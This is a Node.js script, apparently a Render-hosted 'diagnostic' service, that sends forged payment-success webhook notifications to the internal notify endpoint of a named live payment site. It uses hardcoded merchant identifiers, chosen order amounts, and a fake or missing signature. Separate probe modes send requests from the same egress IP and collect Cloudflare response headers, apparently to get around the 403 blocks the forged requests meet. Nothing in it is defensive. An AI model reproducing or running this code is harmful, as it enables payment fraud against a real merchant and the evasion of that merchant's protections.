// Render service: diagnostic egress — full 403 details + control path from same IP.
const http = require("http");
const https = require("https");
const crypto = require("crypto");
const PORT = process.env.PORT || 10000;

function getEgressIp() {
  return new Promise(res => {
    const r = https.get("https://api.ipify.org?format=json", { headers: { "User-Agent": "Mozilla/5.0" } }, resp => {
      let d = ""; resp.on("data", c => d += c); resp.on("end", () => { try { res(JSON.parse(d).ip); } catch (e) { res("err"); } });
    });
    r.on("error", () => res("err"));
    r.setTimeout(8000, () => { r.destroy(); res("timeout"); });
  });
}
function buildBody(order, amount, status, tradeToken) {
  const now = new Date().toISOString();
  return JSON.stringify({
    code: "APPLY_SUCCESS", msg: "", keyVersion: "1",
    appId: "04ce10e83c934f8d9d3b076b6cf22b47", merchantNo: "P01010114042389",
    notifyTime: now, notifyType: "PAYMENT",
    data: {
      outTradeNo: order, tradeToken: tradeToken,
      totalAmount: parseFloat(amount), currency: "SAR", country: "SA",
      status, completeTime: now,
      paymentDetails: [{ paymentMethodType: "CARD", targetOrg: "*" }],
      reference: "020213827524152",
    },
  });
}
function rawRequest(opts, body) {
  return new Promise(res => {
    const r = https.request(opts, resp => {
      let d = ""; resp.on("data", c => d += c);
      resp.on("end", () => res({ status: resp.statusCode, statusMessage: resp.statusMessage, headers: resp.headers, body: d }));
    });
    r.on("error", e => res({ err: e.message.slice(0, 150) }));
    r.setTimeout(20000, () => { r.destroy(); res({ err: "timeout" }); });
    if (body) r.write(body);
    r.end();
  });
}
function pickHeaders(h) {
  // return a focused set of CF-relevant headers
  const keys = ["cf-ray","cf-cache-status","cf-request-id","server","set-cookie","x-served-by","x-cache","via","x-envoy-upstream-service-time","x-request-id","report-to","nel","cf-bg","x-powered-by","date"];
  const out = {};
  for (const k of keys) if (h[k] !== undefined) out[k] = h[k];
  return out;
}
const UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/153.0 Safari/537.36";
const server = http.createServer(async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }
  const url = new URL(req.url, "http://x");
  const mode = url.searchParams.get("mode") || "notify";
  const out = { egressIp: await getEgressIp(), mode };
  try {
    if (mode === "control") {
      // GET the homepage (non-blocked path) from the same egress IP
      const c = await rawRequest({ host: "www.yallapay.live", port: 443, path: "/", method: "GET",
        headers: { "User-Agent": UA, "Accept": "text/html,*/*", "Host": "www.yallapay.live" } });
      out.control = c.err ? { err: c.err } : { status: c.status, headers: pickHeaders(c.headers), bodyLen: (c.body||"").length, title: ((c.body||"").match(/<title>([^<]*)<\/title>/)||[])[1] || "" };
    } else if (mode === "control-api") {
      // GET a public API path (not /api/internal/) from the same egress IP
      const p = url.searchParams.get("path") || "/api/Product/GetProductList";
      const c = await rawRequest({ host: "www.yallapay.live", port: 443, path: p, method: "GET",
        headers: { "User-Agent": UA, "Accept": "application/json", "Host": "www.yallapay.live" } });
      out.controlApi = c.err ? { err: c.err, path: p } : { status: c.status, headers: pickHeaders(c.headers), body: (c.body||"").slice(0,300), path: p };
    } else {
      // notify: POST forged notification, FULL headers + FULL body
      const order = url.searchParams.get("order") || "yap_260923065847291789838";
      const amount = url.searchParams.get("amount") || "43";
      const signMode = url.searchParams.get("sign") || "fake";
      const path = url.searchParams.get("path") || "/api/Internal/Notify";
      const status = url.searchParams.get("status") || "SUCCESS";
      const tradeToken = url.searchParams.get("tradeToken") || "T2026092306093073421547";
      let signHeader = signMode === "none" ? "" : (signMode === "fake" ? crypto.randomBytes(256).toString("base64") : signMode);
      const body = buildBody(order, amount, status, tradeToken);
      const r = await rawRequest({ host: "www.yallapay.live", port: 443, path, method: "POST",
        headers: {
          "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body),
          "User-Agent": UA, "Accept": "application/json, text/plain, */*",
          "Origin": "https://www.yallapay.live", "x-site": "1", "sign": signHeader, "Host": "www.yallapay.live",
        } }, body);
      out.notify = r.err ? { err: r.err } : {
        status: r.status, statusMessage: r.statusMessage,
        allHeaders: r.headers,           // FULL headers
        body: r.body,                     // FULL body
        bodyLen: (r.body||"").length,
      };
      const b = r.body || "";
      const m = b.match(/<title>([^<]*)<\/title>/);
      out.cfTitle = m ? m[1] : "";
      const code = b.match(/Error (\d{3,4})|error-code[^>]*>(\d{3,4})|cf-error-code[^>]*>([^<]+)/i);
      out.cfErrorCode = code ? (code[1]||code[2]||code[3]) : "";
    }
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify(out));
  } catch (e) {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify({ err: e.message }));
  }
});
server.listen(PORT, () => console.log("diagnostic listening on " + PORT));
